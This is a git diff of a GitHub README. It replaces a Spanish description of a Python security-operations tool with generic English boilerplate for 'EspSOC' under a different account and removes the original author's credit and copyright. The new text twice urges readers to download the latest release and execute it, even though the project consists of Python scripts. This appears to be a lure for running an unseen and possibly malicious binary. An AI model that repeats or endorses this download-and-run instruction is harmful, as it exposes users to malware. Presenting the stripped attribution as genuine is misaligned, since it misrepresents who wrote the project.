@@ -1,128 +1,114 @@
-# 🛡️ SOC - Security Operations Center en Python
+# EspSOC: Blue Team Tools for Cybersecurity Research and Automation 🛡️
 
-Bienvenido al repositorio de un poderoso y completo **SOC (Centro de Operaciones de Seguridad)** creado con Python. Esta plataforma permite analizar dominios/IPs en tiempo real usando VirusTotal, gestionar usuarios, generar reportes interactivos y notificar resultados a Discord.
+![EspSOC](https://img.shields.io/badge/EspSOC-Python-blue?style=flat&logo=python) ![Version](https://img.shields.io/badge/version-1.0.0-brightgreen) ![License](https://img.shields.io/badge/license-MIT-yellowgreen)
 
----
+Welcome to the **EspSOC** repository! This project is designed to support blue team efforts in cybersecurity through research and automation tools. Whether you are a seasoned professional or a newcomer to the field, this repository aims to provide valuable resources for enhancing your security posture.
 
-## 🚀 Características Principales
+## Table of Contents
 
-🔐 **Sistema de Autenticación**
-- Roles definidos: `root`, `administrador`, `usuario`
-- Contraseñas cifradas con SHA-256
-- Paneles personalizados por rol
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Tools Overview](#tools-overview)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Support](#support)
+9. [Links](#links)
 
-🧠 **Análisis Inteligente de Dominios/IPs**
-- Uso de la API de [VirusTotal](https://www.virustotal.com/)
-- Verificación en listas negras de [Spamhaus](https://www.spamhaus.org/)
-- Clasificación automática: `Seguro`, `Malicioso`, `Error`
+## Introduction
 
-📊 **Dashboard Interactivo**
-- Métricas clave (reportes, usuarios, alertas)
-- Visualización de actividad por usuario
-- Gráficos de torta y barras (matplotlib y plotly)
+In today’s digital landscape, the need for robust cybersecurity measures is paramount. The **EspSOC** project focuses on equipping blue teams with tools that enhance their capabilities in detecting and responding to threats. This repository includes various Python scripts and utilities aimed at streamlining security operations.
 
-📁 **Carga Inteligente de Archivos**
-- Análisis masivo de `.txt` con dominios o IPs
-- Detección y visualización de duplicados
-- Limpieza automática y exportación a `.txt`, `.csv` o `.json`
+## Features
 
-📤 **Integración con Discord**
-- Envío de resultados directamente al usuario por mensaje privado
-- Bot funcional con conexión automática
-- Envío de gráficos como imágenes adjuntas
+- **Virus Scanning**: Integrate with VirusTotal API to analyze files and URLs for potential threats.
+- **IP Address Analysis**: Tools for checking the reputation and geolocation of IP addresses.
+- **Automation Scripts**: Automate routine security tasks to save time and reduce human error.
+- **Research Tools**: Resources for conducting in-depth analysis of cybersecurity threats.
 
-👥 **Gestión de Usuarios**
-- Crear, editar y eliminar usuarios
-- Filtros dinámicos por nombre y rol
-- Interfaz intuitiva con `customtkinter`
+## Installation
 
----
+To get started with **EspSOC**, you need to clone the repository and install the required dependencies. Follow these steps:
 
-## 🛠️ Instalación
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/Cezarypakula/EspSOC.git
+   cd EspSOC
+   ```
 
-1. **Clona el repositorio**:
-```bash
-git clone https://github.com/tuusuario/soc-python.git
-cd soc-python
-```
+2. Install the necessary packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-2. **Instala las dependencias**:
-```bash
-pip install -r requirements.txt
-```
+3. Download the latest release from [here](https://github.com/Cezarypakula/EspSOC/releases). Execute the downloaded file to set up the tools.
 
-3. **Ejecuta el proyecto**:
-```bash
-python pyqt.py
-```
+## Usage
 
-> 🧪 Usuario por defecto: `admin`  
-> 🔑 Contraseña por defecto: `admin123`
+Once you have installed **EspSOC**, you can start using the tools provided. Each tool has its own documentation and usage instructions. Here’s a brief overview of how to run a basic scan:
 
----
+1. Navigate to the tool directory:
+   ```bash
+   cd tools/virus_scanner
+   ```
 
-## 📂 Estructura del Proyecto
+2. Run the script:
+   ```bash
+   python scan.py <file_or_url>
+   ```
 
-```
-📦 soc-python/
-├── root/
-│   └── app.py           # Interfaz avanzada para usuarios root (SOC, dashboard, reportes, usuarios)
-├── pyqt.py              # Sistema de login, interfaz de administrador y acceso a funcionalidades
-├── validar.py           # Módulo para análisis de dominios/IPs y envío a Discord
-├── usuarios.db          # Base de datos SQLite para usuarios
-├── reportes.db          # Base de datos SQLite para reportes de análisis
-├── correo.db            # (Opcional) Correos guardados para envío masivo
-├── requirements.txt     # Archivo con las dependencias del proyecto
-└── README.md            # Documentación del proyecto
-```
+3. Review the output for any detected threats.
 
----
+## Tools Overview
 
-## 📈 Capturas de Pantalla
+### Virus Scanner
 
-> *![image](https://github.com/user-attachments/assets/2f8b0f8c-9eaf-44a3-8e17-4d5aac0b01fe)*
-> *![image](https://github.com/user-attachments/assets/34131284-ae73-492c-b2bd-33bbb18113bd)*
-> *![image](https://github.com/user-attachments/assets/f8e85e80-0a03-4443-b425-0a2cd0b9d885)*
-> *![image](https://github.com/user-attachments/assets/37504661-d62d-401d-bc73-10170598a068)*
-> *![image](https://github.com/user-attachments/assets/a9bba4de-4328-4566-9a39-a606c35170d6)*
-> *![image](https://github.com/user-attachments/assets/cd6d7dd0-4031-4fd0-b985-31f3b7b6adaa)*
-> *![image](https://github.com/user-attachments/assets/f2b42674-ec41-446e-9c30-1a29ba219bf0)*
-> *![image](https://github.com/user-attachments/assets/61455366-f2d8-4796-9f08-6d2a2f82ea43)*
-> *![image](https://github.com/user-attachments/assets/ee586224-8de7-4165-9ba0-faa9b5bf58c5)*
-> *![image](https://github.com/user-attachments/assets/c929b24b-8a5a-47c9-b0f3-a7ed6971277f)*
-> *![image](https://github.com/user-attachments/assets/b158e29e-8c31-4ed5-91a1-c6aa87aed7e7)*
-> *![image](https://github.com/user-attachments/assets/e5291e63-e601-497b-afc4-4aab181dd5c7)*
----
+This tool connects to the VirusTotal API to check files and URLs against a database of known threats. You can input a file path or a URL, and the script will return the analysis results.
 
-## 🎯 To-Do
+### IP Reputation Checker
 
-- [ ] Dashboard web en Flask
-- [ ] Integración con SIEMs (Splunk, Graylog, etc.)
-- [ ] Sistema de notificaciones por correo
-- [ ] Reglas personalizadas para detección
+Use this tool to assess the reputation of an IP address. It fetches data from various sources to provide insights into whether an IP is associated with malicious activity.
 
----
+### Automation Scripts
 
-## 👨‍💻 Autor
+The automation scripts are designed to handle repetitive tasks. You can customize these scripts to fit your specific security needs.
 
-Desarrollado por **[Phsyco]**  
-🔗 GitHub: [https://github.com/AudiForze](https://github.com/AudiForze)  
-📫 Contacto: *[geremygomez312@gmail.com]* o *[Discord: physco_0312]*
+### Research Tools
 
----
+These tools assist in gathering intelligence on threats. They can help you understand attack vectors and vulnerabilities.
 
-## 🛡️ Licencia
+## Contributing
 
-Este proyecto está licenciado bajo la **MIT License**.
+We welcome contributions from the community! If you have ideas for new features or improvements, please follow these steps:
 
-```
-MIT License
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your feature"
+   ```
+4. Push to your fork:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Create a pull request.
 
-Copyright (c) 2025 Geremy
+## License
 
-Se concede permiso, de forma gratuita, a cualquier persona que obtenga una copia de este software y los archivos de documentación asociados (el "Software"), para utilizar el Software sin restricción, incluyendo sin limitación los derechos de usar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar y/o vender copias del Software, y permitir a las personas a quienes se les proporcione el Software que lo hagan, sujeto a las siguientes condiciones:
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-El aviso de copyright anterior y este aviso de permiso se incluirán en todas las copias o partes sustanciales del Software.
+## Support
 
-EL SOFTWARE SE PROPORCIONA "TAL CUAL", SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA, INCLUYENDO PERO NO LIMITADO A GARANTÍAS DE COMERCIALIZACIÓN, IDONEIDAD PARA UN PROPÓSITO PARTICULAR Y NO INFRACCIÓN.
-```
+If you encounter any issues or have questions, please open an issue in the repository. We are here to help!
+
+## Links
+
+For the latest releases, visit [here](https://github.com/Cezarypakula/EspSOC/releases). Download the latest version and execute it to start using the tools.
+
+![EspSOC Tools](https://img.shields.io/badge/Tools-Available-brightgreen)
+
+Explore the tools, enhance your skills, and contribute to the cybersecurity community with **EspSOC**. Together, we can build a safer digital environment.
